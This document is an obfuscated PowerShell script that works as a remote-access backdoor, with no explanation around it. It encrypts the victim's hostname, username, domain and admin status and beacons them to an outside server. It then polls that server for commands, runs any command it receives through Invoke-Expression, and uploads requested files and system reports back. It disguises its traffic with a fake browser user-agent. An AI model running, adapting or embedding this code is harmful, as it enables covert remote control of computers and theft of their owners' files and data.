$ICQ = 5;
$SOAYNTNKN = "TUZKU1RTV1dDQlFOTUVUS1dGUkRDRVFWREpTQUtVWVc=";
$UN = "Sk9BWEZTQllCQVJRSFdQVw=="

function TWMV($SOAYNTNKN, $UN) {
    $NCMZFBWFK = New-Object "System.Security.Cryptography.AesManaged"
    $NCMZFBWFK.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $NCMZFBWFK.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $NCMZFBWFK.BlockSize = 128
    $NCMZFBWFK.KeySize = 256
    if ($UN) {
        if ($UN.getType().Name -eq "String") {
            $NCMZFBWFK.IV = [System.Convert]::FromBase64String($UN)
        }
        else {
            $NCMZFBWFK.IV = $UN
        }
    }
    if ($SOAYNTNKN) {
        if ($SOAYNTNKN.getType().Name -eq "String") {
            $NCMZFBWFK.Key = [System.Convert]::FromBase64String($SOAYNTNKN)
        }
        else {
            $NCMZFBWFK.Key = $SOAYNTNKN
        }
    }
    $NCMZFBWFK
}

function TWQSASS($SOAYNTNKN, $UN, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $NCMZFBWFK = TWMV $SOAYNTNKN $UN
    $W = $NCMZFBWFK.CreateEncryptor()
    $encryptedData = $W.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Convert]::ToBase64String($encryptedData)
}

function T($SOAYNTNKN, $UN, $cipher) {
    $bytes = [System.Convert]::FromBase64String($cipher)
    $NCMZFBWFK = TWMV $SOAYNTNKN $UN
    $decryptor = $NCMZFBWFK.CreateDecryptor();
    $TQYQSDGXM = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Text.Encoding]::UTF8.GetString($TQYQSDGXM).Trim([char]0)
}


$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$wcr = New-Object system.Net.WebClient;
$hostname = $env:COMPUTERNAME;
$UH = TWQSASS $SOAYNTNKN $UN $hostname
$RDKL = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$r2 = $RDKL;
$DNGORG = "$hostname-$r2";
$FF = $env:USERNAME;
$whmenc = TWQSASS $SOAYNTNKN $UN $FF
$AREAFVPKN = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$NE = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($AREAFVPKN)";
$BNPMSLPZX = (Get-WmiObject Win32_ComputerSystem).Domain;


$procarch = [Environment]::Is64BitProcess
$procarchf = ""
if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}

$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"

$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if($iselv){
$FF = $FF + "*"
}

$raw_header = "$DNGORG,$FF,$NE,$pnid,$BNPMSLPZX";
$encrypted_header = TWQSASS $SOAYNTNKN $UN $raw_header;
$final_hostname_encrypted = TWQSASS $SOAYNTNKN $UN $DNGORG

$wch = $wc.headers;
$wch.add("Authorization", $encrypted_header);
$wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");

$wc.downloadString("http://hpsj.firewall-gateway.net:80/login");
$failure_counter = 0;
while($true){

    try{
    $command_raw = $wc2.downloadString("http://hpsj.firewall-gateway.net:80/view/$DNGORG");
    }catch{
    $failure_counter=$failure_counter +1;
    if ($failure_counter -eq 10){
    kill $pid
    }
    }

    $final_command = T $SOAYNTNKN $UN $command_raw
    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)

    if($fc -eq "False"){

    } elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
      $ps+= $arr -join ";"
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $ps+= (Get-WinSystemLocale).Name
      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
      $pst = TWQSASS $SOAYNTNKN $UN $ps
      $wcrh = $wcr.Headers;
      $wcrh.add("Authorization", $pst);
      $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
      $wcrh.add("App-Logic", $UH);
      $wcr.downloadString("http://hpsj.firewall-gateway.net:80/calls");
    } elseif($fc.split(" ")[0] -eq "Download"){
        $filename = TWQSASS $SOAYNTNKN $UN $fc.split("\")[-1]
        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
        $PCCXWSQM = [Convert]::ToBase64String($file_content);
        $efc = TWQSASS $SOAYNTNKN $UN $PCCXWSQM;
        $EFPYAOB = new-object net.WebClient;
        $LSMOLURUS = $EFPYAOB.Headers;
        $LSMOLURUS.add("Content-Type", "application/x-www-form-urlencoded");
        $LSMOLURUS.add("x-Authorization", $whmenc);
        $EFPYAOB.UploadString("http://hpsj.firewall-gateway.net:80/messages", "fn=$filename&token=$efc");
    } elseif($fc -eq "reset-ps"){
        try{
        # Reset Powershell session (clean)
        # NOT IMPLEMENTED YET
        $ec = "NO";
        }
        catch{
        $ec = $Error[0] | Out-String;
        }

        $PCCXWSQM = TWQSASS $SOAYNTNKN $UN $ec;
        $EFPYAOB = New-Object system.Net.WebClient;
        $EFPYAOB.Headers["App-Logic"] = $final_hostname_encrypted;
        $EFPYAOB.Headers["Authorization"] = $PCCXWSQM;
        $EFPYAOB.Headers["Session"] = $command_raw;
        $EFPYAOB.downloadString("http://hpsj.firewall-gateway.net:80/bills");
    } else{
      try{
        $ec = Invoke-Expression ($fc) | Out-String;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
        $PCCXWSQM = TWQSASS $SOAYNTNKN $UN $ec;
        $EFPYAOB = New-Object system.Net.WebClient;
        $EFPYAOB.Headers["App-Logic"] = $final_hostname_encrypted;
        $EFPYAOB.Headers["Authorization"] = $PCCXWSQM;
        $EFPYAOB.Headers["Session"] = $command_raw;
        $EFPYAOB.downloadString("http://hpsj.firewall-gateway.net:80/bills");
    }

    sleep $ICQ;
    }
